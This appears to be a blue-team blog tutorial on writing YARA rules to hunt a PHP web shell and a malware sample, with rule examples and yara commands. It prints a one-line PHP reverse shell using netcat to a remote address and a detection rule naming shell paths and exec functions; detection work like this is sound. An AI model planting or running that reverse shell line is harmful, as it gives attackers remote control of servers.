---
layout: post
title: "Threat Hunting with Yara Rules"
description: "Detecting Malware using YARA Rules"
thumb_image: "screenshots/yara/thumb.png"
tags: [blue_team, threat_hunting]
---

### Introduction.

YARA Rules are like a piece of programming language aimed at helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families based on textual or binary patterns. Each description (rule) consists of a set of strings and a boolean expression which determine its logic:

Here is an example based on the [YARA documentation](https://yara.readthedocs.io/en/stable/):

```js
rule silent_banker : banker
{
    meta:
        description = "This is just an example"
        threat_level = 3
        in_the_wild = true
    strings:
        $a = {6A 40 68 00 30 00 00 6A 14 8D 91}
        $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
        $c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
    condition:
        $a or $b or $c
}
```

<br>
In Linux you can just pull yara from the repository, for example in Debian distros you can just do  `apt install yara`.
For Windows, you’ll need to download the binaries.
You can get full Installation instructions from [here](https://yara.readthedocs.io/en/stable/gettingstarted.html).

The rule starts with a name, and then has three sections:

- The `meta` section contains the description, author, reference, date, hash, and other details. This section is optional and will not be used to classify malware.
- The `strings` section contains all the malicious string patterns that need to be searched for in files.
- The `condition` section defines the conditions that you want to check so that your Yara rules can trigger a match.

<br>
<hr>
<br>

### Writing your wwn Yara Rules.

<br>

##### Scenario 01

> you came to the realization that your web server is compromised and an attacker used an application running on your webserver to gain a foothold by uploading a malicious file that gave an attacker access to your webserver. Now you need to write a Yara rule to hunt that uploaded malicious file across your application.

Here is the directory structure of your application:

{% include image.html path="screenshots/yara/1.png" path-detail="screenshots/yara/1.png" alt="Sample image" %}

To hunt a malicious file, we need to know the strings contained in that file, here is an example of a malicious file that can get you a reverse shell.

```php
<?php system("nc -e /bin/sh 10.0.0.1 1234"); ?>
```

<br>

So we need to know the strings to search for, since our compromised application is a PHP application we can try to search the occurrence of strings like `system`, `exec`, `shell_exec` and `passthru` in our application folder with are used to run [system commnads](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/) like `ls`, also we need to search for strings like `/bin/sh`, `/bin/sh`, `/dev/tcp`, `cmd.exe` which when combined with system commands they can get you a reverse shell.

Now that we know the strings to search for, We can write a Yara rule to find malicious files:

```
rule php_shell
{
    meta:
        description= "Detecting PHP Reverse Shells"
        author = "Karim Muya"
        date = "2022-05-18"

    strings:
        $cmd1 = "system" wide ascii
        $cmd2 = "exec" wide ascii
        $cmd3 = "shell_exec" wide ascii
        $cmd4 = "passthru" wide ascii
        $string1 = "/bin/bash" wide ascii
        $string2 = "/bin/sh" wide ascii
        $string3 = "/dev/tcp/" wide ascii
        $string4 = "cmd.exe" wide ascii

    condition:
        any of ($cmd*) and (any of ($string*))
}
```

<br>

- As we can see the `string` section has all the possible strings we need to search for.
- In condition section, `any of ($cmd*) and (any of ($string*))` states that:
  match the occurrence of any of `$cmd` which can be `system`, `exec`, `shell_exec` or `passthru` combine with occurrence of any of `$string` which can be `/bin/bash`, `/bin/sh`, `/dev/tcp` or `cmd.exe`.

<br>
 
###### Running our Yara rule
 <br>

We can now run this against a directory containing our application. We’ll use -r to search into subdirectories, give it my rule, and the directory to check.
<br>

```
 yara -r detect.yar web-application
```

 <br>
After running the command, we see a hit. It returns the name of the rule that matched, and the file that matched:
<br>
<br>
{% include image.html path="screenshots/yara/2.png" path-detail="screenshots/yara/2.png" alt="Sample image" %}

<br>
As we can see, the malicious file was disguised itself as `contact.php`, when we look at the contents of the file we can see it is actually a reverse shell.

{% include image.html path="screenshots/yara/3.png" path-detail="screenshots/yara/3.png" alt="Sample image" %}

<br>
<hr>
<br>

##### Scenario 02

> You are a Threat Hunter and found a malicious file (malware) within one of your systems in your organization. You have been tasked to analyze the malware and write a Yara rule and then search for its occurrence across your organization's network.

Now again we need to find strings or patterns and conditions to detect the malicious file. This time we will use IDA pro to find only unique strings.

<br>
{% include image.html path="screenshots/yara/4.png" path-detail="screenshots/yara/4.png" alt="Sample image" %}

There are alot of strings contained in the malware file but We will pick `ntdll.dll`, `shell32`, `ws2_32`, `mswsock`, `advapi32` and `kernel32` as our uniques strings.

<br>
{% include image.html path="screenshots/yara/5.png" path-detail="screenshots/yara/5.png" alt="Sample image" %}

The string 'shell32' is highlighted and its corresponding hexadecimal representation is also highlighted. Using this information we can declare a hex string within a YARA rule.

Now that we know the strings to match , We can write a Yara rule to find malicious files:

```js
rule hunt
{
    meta:
        description= "Detecting a custom malicious file"
        author = "Karim Muya"
        date = "2022-05-18"

    strings:
        $s1 = { 6E 74 64 6C 6C 2E 64 6C 6C 00 }  // ntdll.dll
        $s2 = { 73 68 65 6C 6C 33 32 00 }        // shell32
        $s3 = { 77 73 32 5F 33 32 00 }           // ws2_32
        $s4 = { 6D 73 77 73 6F 63 6B 00 }        // mswsock
        $s5 = { 61 64 76 61 70 69 33 32  00 }    // advapi32
        $S6 = { 6B 65 72 6E 65 6C 33 32 00 }     // kernel32


    condition:
        all of them
}
```

<br>

###### Running our Yara rule

 <br>
We can now run this against C: in Windows. We’ll use -r to search into subdirectories, give it my rule:

```
 .\yara64.exe -r hunt.yar C: 2>&1
```

 <br>
 
 `2>&1` is just a way of not showing stderr

After running the command, we see a hit. It returns the name of the rule that matched, and the file that matched:
<br>
<br>
{% include image.html path="screenshots/yara/6.png" path-detail="screenshots/yara/6.png" alt="Sample image" %}



<br>
<hr>
<br>

##### Conclusion:

Now that you have the knowledge you can start building your own Yara rules to start hunting malwares. I hope you’ve enjoyed this post.

<br>
<hr>
<br>

##### References.

- [https://yara.readthedocs.io/en/stable/gettingstarted.html](https://yara.readthedocs.io/en/stable/gettingstarted.html)
- [https://blog.apnic.net/2021/10/19/threat-hunting-101-hunting-with-yara-rules/](https://blog.apnic.net/2021/10/19/threat-hunting-101-hunting-with-yara-rules/)
